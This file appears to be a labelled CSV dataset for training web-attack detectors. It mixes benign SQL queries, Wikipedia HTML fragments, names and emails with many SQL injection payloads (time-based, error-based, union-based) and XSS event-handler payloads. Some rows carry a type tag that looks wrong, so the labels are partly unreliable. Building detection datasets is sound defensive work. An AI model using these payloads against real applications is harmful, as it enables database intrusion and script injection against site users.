Text,Label,type
<output id=x tabindex=1 onfocus=alert(1)></output>,2,xss
"1""  )   where 7950  =  7950 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
" </p><p><a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> has used <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Moore's law </a> (which describes the relentless exponential improvement in digital technology) to calculate that <a href=""/wiki/Desktop_computer"" title=""Desktop computer"">desktop computers </a> will have the same processing power as human brains by the year 2029, and predicts that the singularity will occur in 2045.<sup id=""cite_ref-Singularity_410-2"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup>",0,xss
"1 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
br8c99ma4290,0,sql
	 </span>,0,xss
"        <script src=""_static/js/hoverxref.js""></script>",0,xss
7.28868E+15,0,sql
SELECT * FROM rather WHERE gather LIKE '%heard%',0,sql
"<li><a href=""/wiki/Galileo_Galilei"" title=""Galileo Galilei"">Galileo Galilei </a> </li>",0,xss
"<a href=""/wiki/Explanation_based_learning"" class=""mw-redirect"" title=""Explanation based learning"">Explanation based learning </a>, relevance based learning, <a href=""/wiki/Inductive_logic_programming"" title=""Inductive logic programming"">inductive logic programming </a>, <a href=""/wiki/Case_based_reasoning"" class=""mw-redirect"" title=""Case based reasoning"">case based reasoning </a>:",0,xss
SELECT AVG ( rice ) FROM car,0,sql
"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
 UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed',0,sql
"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",1,sql
"1""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""agaz""  =  ""agaz",1,sql
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
"<a href=""/wiki/Kernel_methods"" class=""mw-redirect"" title=""Kernel methods"">kernel methods </a> such as the <a href=""/wiki/Support_vector_machine"" class=""mw-redirect"" title=""Support vector machine"">support vector machine </a> (SVM),<sup id=""cite_ref-224"" class=""reference""><a href=""#cite_note-224"">&#91;h&#93; </a> </sup><sup id=""cite_ref-Kernel_methods_225-0"" class=""reference""><a href=""#cite_note-Kernel_methods-225"">&#91;217&#93; </a> </sup>",0,xss
antone1@tiendasyofertas.ve,0,sql
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></strike>",2,xss
SELECT continent ( s )  FROM him SELECT grain ( s ) ,0,sql
SELECT cost ( s )  FROM hurt LEFT JOIN,0,xss
	 </span> ,0,xss
31013,0,sql
-4339  )   where 7178  =  7178 or 4008  =  7232,1,xss
"   SELECT Employees.level, COUNT ( Orders.additionID )  AS circusFROM    ( OrdersINNER JOIN service ON Orders.southID  =  Employees.stairsID ) ",0,sql
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>,2,xss
"<wbr onmouseleave=""alert(1)"">test</wbr>",2,xss
4.47874E+15,0,sql
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,xss
SELECT * FROM slight WHERE    NOT tales = 'arrive',0,xss
"""<a href=""/wiki/History_of_AI#The_golden_years_1956–1974"" class=""mw-redirect"" title=""History of AI"">Golden years </a>"" of AI (successful symbolic reasoning programs 1956–1973):",0,xss
SELECT Count ( * )  AS mission,0,sql
palmario,0,xss
rains8,0,sql
SELECT TOP 3 * FROM wait WHERE electric = 'southern',0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",1,sql
94731203e,0,sql
3.74288E+15,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",1,sql
"	 </span> <span class=""toctext"">Knowledge representation ",0,xss
"1' union all select null,null,null,null,null,null,null,null,null,null#",1,xss
doa,0,xss
aguazo,0,sql
nahid,0,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",0,xss
SELECT * FROM understanding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0,sql
"   SELECT memory, guard, hungry FROM feathers WHERE deer  IS NULL",0,sql
	 </span>,0,xss
elvian,0,xss
SELECT * FROM package WHERE weight NOT LIKE '[six]%',0,sql
41100,0,sql
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
"<a href=""/wiki/Gaussian_mixture_model"" class=""mw-redirect"" title=""Gaussian mixture model"">Gaussian mixture model </a>,<sup id=""cite_ref-Gaussian_mixture_model_226-0"" class=""reference""><a href=""#cite_note-Gaussian_mixture_model-226"">&#91;218&#93; </a> </sup> and the extremely popular <a href=""/wiki/Naive_Bayes_classifier"" title=""Naive Bayes classifier"">naive Bayes classifier </a>.<sup id=""cite_ref-228"" class=""reference""><a href=""#cite_note-228"">&#91;i&#93; </a> </sup><sup id=""cite_ref-Naive_Bayes_classifier_229-0"" class=""reference""><a href=""#cite_note-Naive_Bayes_classifier-229"">&#91;220&#93; </a> </sup> Classifier performance depends greatly on the characteristics of the data to be classified, such as the dataset size, distribution of samples across classes, the dimensionality, and the level of noise. Model-based classifiers perform well if the assumed model is an extremely good fit for the actual data. Otherwise, if no matching model is available, and if accuracy (rather than speed or scalability) is the sole concern, conventional wisdom is that discriminative classifiers (especially SVM) tend to be more accurate than model-based classifiers such as ""naive Bayes"" on most practical data sets.<sup id=""cite_ref-Classifier_performance_230-0"" class=""reference""><a href=""#cite_note-Classifier_performance-230"">&#91;221&#93; </a> </sup><sup id=""cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231"">&#91;222&#93; </a> </sup>",0,xss
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'rdpv'  =  'rdpv",1,xss
despacha!do,0,xss
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,2,xss
	 </span> </h3>,0,xss
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
1'   )    )    and sleep  (  5  )  #,1,sql
rodo de la cerda,0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=WIRED&amp;rft.atitle=AI+Has+a+Hallucination+Problem+That%27s+Proving+Tough+to+Fix&amp;rft.date=2018&amp;rft_id=https%3A%2F%2Fwww.wired.com%2Fstory%2Fai-has-a-hallucination-problem-thats-proving-tough-to-fix%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  ",0,sql
<cite onpointermove=alert(1)>XSS</cite>,2,xss
boggs@cocteleria.dz,0,sql
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',0,sql
"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow )  VALUES  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT stronger ( s )  FROM machine SELECT proud ( s ) ,0,sql
<ul>,0,xss
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1,sql
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",1,sql
"<u onmouseover=""alert(1)"">test</u>",2,xss
"   SELECT mistake, clock, neededFROM burst WHERE play  IS NOT NULL",0,xss
"<plaintext oncopy=""alert(1)"" contenteditable>test</plaintext>",2,xss
apolilladura,0,sql
du-tuan,0,sql
SELECT * FROM speed 3 SELECT * FROM listen,0,xss
-5500'  )   order by 1--,1,sql
"<li><a href=""/wiki/Memetic_algorithm"" title=""Memetic algorithm"">Memetic algorithm </a> </li> </ul>",0,xss
malia,0,sql
"<li><a href=""/wiki/Graphics_processing_unit"" title=""Graphics processing unit"">Graphics processing unit </a> </li>",0,xss
"   SELECT loud, fair+ ', ' + familiar+ ' ' + lunch+ ', ' + fence AS captured  FROM organized",0,sql
SELECT COUNT ( DISTINCT guess )  FROM stiff,0,sql
1 where 2382  =  2382,1,sql
SELECT MIN ( explain )  AS wrote FROM eight,0,sql
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",1,xss
3.62829E+15,0,sql
SELECT * FROM swim WHERE ship NOT LIKE '[suppose]%',0,sql
"<option oncontextmenu=""alert(1)"">test</option>",2,xss
SELECT * FROM coming  WHERE dot NOT LIKE '[raise]%',0,sql
2ovi4in,0,sql
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",1,sql
"<tbody onmousemove=""alert(1)"">test</tbody>",2,xss
 or 2 > 1,1,sql
"1'   )    )    union all select null,null,null#",1,sql
SELECT Count ( * )  AS imagine,0,sql
"<strike oncopy=""alert(1)"" contenteditable>test</strike>",2,xss
boys@muebetuweb.mu,0,sql
SELECT COUNT ( DISTINCT breeze )  FROM mean,0,xss
FROM  ( SELECT DISTINCT six FROM thrown ) ,0,sql
rosselot azcona,0,sql
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",2,xss
"  SELECT then,steel FROM shoe WHERE opinion = 'once' UNION SELECT physical, changing FROM gulf",0,sql
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect',0,sql
"1%""   )    )    union all select null,null,null,null,null,null,null--",1,sql
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",1,xss
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c886d67719' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
vilanova de arousa,0,xss
"INSERT INTO six  ( solid, automobile, wore )  VALUES  ( 'hope', 'leather', 'smallest' )  ",0,sql
SELECT * FROM rise,0,sql
SELECT * FROM room WHERE tide = 'mighty'  OR plenty = 'of',0,sql
16124624z,0,sql
visionario,0,sql
"royo, el",0,sql
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,sql
SELECT * FROM us WHERE zoo BETWEEN '1996-07-01' AND '1996-07-31',0,sql
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,sql
se0am536e,0,sql
SELECT COUNT ( worryID ) FROM dog,0,xss
"<object onmousedown=""alert(1)"">test</object>",2,xss
"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,sql
" </div>  <div id=""left-navigation"">",0,xss
20001,0,sql
SELECT * FROM mass WHERE rubbed  BETWEEN 10 AND 20,0,sql
<noframes onpointerleave=alert(1)>XSS</noframes>,2,xss
"1"" where 5250  =  5250",1,sql
siu-kwok,0,sql
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,2,xss
dalleto poroma,0,sql
SELECT heart,0,sql
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
	 </span></p>,0,xss
SELECT COUNT ( grandmother ) FROM has,0,sql
 </li>,0,xss
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,xss
"<span onmouseup=""alert(1)"">test</span>",2,xss
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""exgr"" like ""exgr",1,sql
"<data onbeforecut=""alert(1)"" contenteditable>test</data>",2,xss
"<IMG SRC=""jav&#x0D;ascript:alert('');"">",2,xss
sarri de ter,0,sql
SELECT * FROM folks WHERE activity IN  ( SELECT frozen FROM did ) ,0,sql
"1%""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0,xss
8.0957E+15,0,sql
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",1,xss
"<li><a href=""/wiki/Robotics_simulator"" title=""Robotics simulator"">Simulator </a> </li>",0,xss
SELECT AVG ( ate ) FROM wrapped SELECT SUM ( real ) ,0,xss
-1217'   )    )     )   order by 1#,1,sql
"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1,xss
SELECT AVG ( coming ) FROM frame SELECT SUM ( test ) ,0,sql
"<IMG SRC='vbscript:msgbox("""")'>",2,xss
"<li><a href=""/wiki/Philosophy_of_psychiatry"" title=""Philosophy of psychiatry"">Psychiatry </a> </li>",0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Algorithm"" title=""Algorithm"">Algorithms </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
1'   )    )    as tlsl where 8467  =  8467,1,sql
"-8557 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
1'  )   where 8291  =  8291,1,sql
SELECT * FROM corn WHERE bite BETWEEN 'at' AND 'share',0,sql
penarroya ingla,0,sql
x' or 1  =  1 or 'x'  =  'y,1,sql
SELECT AVG ( base ) FROM since SELECT SUM ( smallest ) ,0,xss
"<tfoot onbeforecut=""alert(1)"" contenteditable>test</tfoot>",2,xss
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",1,sql
nebila,0,sql
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></u>",2,xss
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,2,xss
SELECT AVG ( skill ) FROM tower SELECT SUM ( great ) ,0,sql
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",1,xss
 </li>,0,xss
SELECT * FROM [Brazil Customers]; CREATE PROCEDURE SelectAllCustomers AS,0,sql
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx",1,sql
SELECT pleasant ( s )  FROM long SELECT such ( s ) ,0,sql
"<p>If research into <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">Strong AI </a> produced sufficiently intelligent software, it might be able to reprogram and improve itself. The improved software would be even better at improving itself, leading to <a href=""/wiki/Intelligence_explosion"" class=""mw-redirect"" title=""Intelligence explosion"">recursive self-improvement </a>.<sup id=""cite_ref-recurse_409-0"" class=""reference""><a href=""#cite_note-recurse-409"">&#91;397&#93; </a> </sup> The new intelligence could thus increase exponentially and dramatically surpass humans. Science fiction writer <a href=""/wiki/Vernor_Vinge"" title=""Vernor Vinge"">Vernor Vinge </a> named this scenario ""<a href=""/wiki/Technological_singularity"" title=""Technological singularity"">singularity </a>"".<sup id=""cite_ref-Singularity_410-0"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup> Technological singularity is when accelerating progress in technologies will cause a runaway effect wherein artificial intelligence will exceed human intellectual capacity and control, thus radically changing or even ending civilization. Because the capabilities of such an intelligence may be impossible to comprehend, the technological singularity is an occurrence beyond which events are unpredictable or even unfathomable.<sup id=""cite_ref-Singularity_410-1"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup><sup id=""cite_ref-Roberts_147-2"" class=""reference""><a href=""#cite_note-Roberts-147"">&#91;144&#93; </a> </sup>",0,xss
 </div>,0,xss
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT AVG ( truth )  FROM slope  SELECT SUM ( fully ) ,0,sql
SELECT Count ( * )  AS paragraph,0,sql
caputo,0,xss
SELECT TOP 50 PERCENT * FROM customs,0,sql
lacavex lafont,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></option>",2,xss
"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '",1,sql
1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--,1,xss
1' where 1652  =  1652 and sleep  (  5  )  #,1,sql
"<li id=""cite_note-184""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-184"">^ </a> </b> ",0,xss
"<a href=""/wiki/Causality#Causal_calculus"" title=""Causality"">Causal calculus </a>:",0,xss
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></img>",2,xss
"<body onkeyup=""alert(1)"" contenteditable>test</body>",2,xss
"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/cs.CV"">cs.CV </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Show+and+Tell%3A+A+Neural+Image+Caption+Generator&amp;rft.date=2015&amp;rft_id=info%3Aarxiv%2F1411.4555&amp;rft.aulast=Vinyals&amp;rft.aufirst=Oriol&amp;rft.au=Toshev%2C+Alexander&amp;rft.au=Bengio%2C+Samy&amp;rft.au=Erhan%2C+Dumitru&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
-2817%'  )   or 8255  =  3841--,1,sql
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1,sql
"c/ peiscola, 95 3?g",0,xss
"1  )   as zdym where 1578  =  1578 union all select null,null,null#",1,xss
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",1,xss
" SELECT column_name ( s )  FROM please,lucky",0,xss
6.5524E+15,0,sql
SELECT ocean FROM ran,0,sql
	 </span>,0,xss
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,0,sql
ratcliffe@921.uk,0,sql
357,0,sql
"-6546""  )   order by 1#",1,sql
"1""   )    )    as jikg where 8258  =  8258 and   (  3973  =  1047  )  *1047--",1,sql
SELECT * FROM  ( SELECT thou FROM pleasant ) ,0,sql
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf",1,sql
" SELECT * FROM rock ORDER BY port, friend",0,sql
" SELECT * FROM label ORDER BY natural ASC, wherever DESC",0,xss
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,sql
"<h3><span class=""mw-headline"" id=""Cybernetics_and_brain_simulation"">Cybernetics and brain simulation ",0,xss
1%' union all select null#,1,sql
eastman@beesmer.lu,0,sql
SELECT COUNT ( publicID ) FROM youth,0,sql
chinarro,0,sql
91553356q,0,sql
DELETE FROM slowly,0,sql
"<Img src = x onerror = ""javascript: window.onerror = alert; throw "">",2,xss
"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>",2,xss
"<li><a href=""/wiki/Distributed_artificial_intelligence"" title=""Distributed artificial intelligence"">Distributed artificial intelligence </a> </li> </ul>",0,xss
"<a ondblclick=""alert(1)"">test</a>",2,xss
SELECT * FROM slave,0,sql
"<sub onmouseenter=""alert(1)"">test</sub>",2,xss
1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sql
"<details onmouseleave=""alert(1)"">test</details>",2,xss
8170,0,xss
"1"" union all select null,null--",1,sql
<article onpointerup=alert(1)>XSS</article>,2,xss
"<input onmouseenter=""alert(1)"">test</input>",2,xss
SELECT COUNT ( plateID ) FROM deer,0,sql
"	 </span> <span class=""reference-text"">",0,xss
" </p><p><a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/Manga"" title=""Manga"">manga </a> <i><a href=""/wiki/Ghost_in_the_Shell"" title=""Ghost in the Shell"">Ghost in the Shell </a> </i> and the science-fiction series <i><a href=""/wiki/Dune_(novel)"" title=""Dune (novel)"">Dune </a> </i>. In the 1980s, artist <a href=""/wiki/Hajime_Sorayama"" title=""Hajime Sorayama"">Hajime Sorayama </a>'s Sexy Robots series were painted and published in Japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the Gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/George_Lucas"" title=""George Lucas"">George Lucas </a> and other creatives. Sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.",0,xss
"   SELECT Employees.connected, COUNT ( Orders.grownID )  AS flowerFROM    ( OrdersINNER JOIN middle ON Orders.cityID  =  Employees.remarkableID ) ",0,sql
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",1,sql
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",2,xss
14860,0,sql
"   SELECT include, eaten, solidFROM die WHERE partly  IS NOT NULL",0,sql
SELECT * FROM win WHERE potatoes BETWEEN 'research' AND 'hospital',0,xss
1' where 5778  =  5778,1,sql
"<li><a href=""#CITEREFNRC1999"">NRC 1999 </a>, pp.&#160;216–222 </li>",0,xss
"<u ondblclick=""alert(1)"">test</u>",2,xss
"<body oncontextmenu=""alert(1)"">test</body>",2,xss
anatoly,0,sql
SELECT COUNT ( sonID ) FROM skin,0,sql
SELECT COUNT ( DISTINCT yes )  FROM guide,0,xss
"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,sql
portelan9,0,xss
"<listing draggable=""true"" ondragstart=""alert(1)"">test</listing>",2,xss
"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna",1,sql
"<figure onmouseout=""alert(1)"">test</figure>",2,xss
<dd onpointermove=alert(1)>XSS</dd>,2,xss
"<h2>All the rest<a class=""headerlink"" href=""#all-the-rest"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"<a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">Computational intelligence </a>",0,xss
"  SELECT labor,needed FROM asleep WHERE current = 'leather' UNION SELECT growth, ran FROM actual",0,sql
"-5526 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
SELECT * FROM move WHERE Price NOT BETWEEN 10 AND 20,0,xss
"   SELECT Employees.sick, COUNT ( Orders.liftID )  AS coupleFROM    ( OrdersINNER JOIN kind ON Orders.factID  =  Employees.courseID ) ",0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",1,xss
offers,0,sql
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',1,sql
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationend=""alert(1)""></font>",2,xss
1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,sql
 </li>,0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1,sql
henrikson@hojainformativas.int,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
1'  )   where 5331  =  5331,1,sql
SELECT FROM_DAYS ( 780500 ) ;,0,sql
SELECT notice ( s )  FROM again SELECT group FROM however,0,sql
if  (  2823  =  3532  )   select 2823 else drop function kmqw--,1,sql
"<a href=""/wiki/Speech_recognition"" title=""Speech recognition"">Speech recognition </a>:",0,xss
	 </span> ,0,xss
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,1,sql
